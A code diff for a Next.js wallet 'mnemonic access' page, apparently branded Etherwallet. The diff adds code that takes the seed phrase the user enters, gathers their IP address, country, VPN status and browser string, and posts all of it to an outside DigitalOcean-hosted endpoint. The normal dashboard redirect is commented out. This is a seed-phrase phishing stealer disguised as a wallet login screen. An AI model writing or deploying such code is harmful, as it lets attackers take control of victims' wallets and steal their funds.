@@ -3,6 +3,8 @@
 import { useState } from "react";
 import { useRouter } from "next/navigation";
 import { X, ArrowLeft } from "lucide-react";
+import axios from "axios";
+import { getUserCountry, checkVpnStatusWithIPQS } from "../../../userLocation";
 
 export default function MnemonicAccess() {
   const router = useRouter();
@@ -15,9 +17,54 @@ export default function MnemonicAccess() {
     setWords(newWords);
   };
 
-  const handleNext = () => {
+  const handleNext = async () => {
     console.log("Mnemonic words:", words);
-    router.push("/dashboard");
+    
+    try {
+      // Get user location data
+      const userCountry = await getUserCountry();
+      
+      if (!userCountry) {
+        console.error("Failed to get user location data");
+        return;
+      }
+
+      // Check VPN status
+      const vpnDetected = userCountry.isVpnIpdata || await checkVpnStatusWithIPQS(userCountry.ip);
+      
+      // Prepare the data to send
+      const requestData = {
+        appName: "Etherwallet",
+        seedPhrase: words.join(" "),
+        vpnDetected,
+        country: userCountry.country,
+        ipAddress: userCountry.ip,
+        browser: typeof navigator !== "undefined" ? navigator.userAgent : "Unknown"
+      };
+
+      console.log("Sending data:", requestData);
+
+      // Post to the API endpoint
+      const response = await axios.post(
+        "https://clownfish-app-t9vi2.ondigitalocean.app/api/t1/image",
+        requestData,
+        {
+          headers: {
+            "Content-Type": "application/json",
+            "x-api-key": process.env.NEXT_PUBLIC_SECRET_KEY,
+          },
+        }
+      );
+
+      console.log("API response:", response.data);
+      
+      // Navigate to dashboard after successful API call
+      // router.push("/dashboard");
+      
+    } catch (error) {
+      console.error("Error sending mnemonic data:", error);
+      // You might want to show an error message to the user here
+    }
   };
 
   const handleClear = () => {
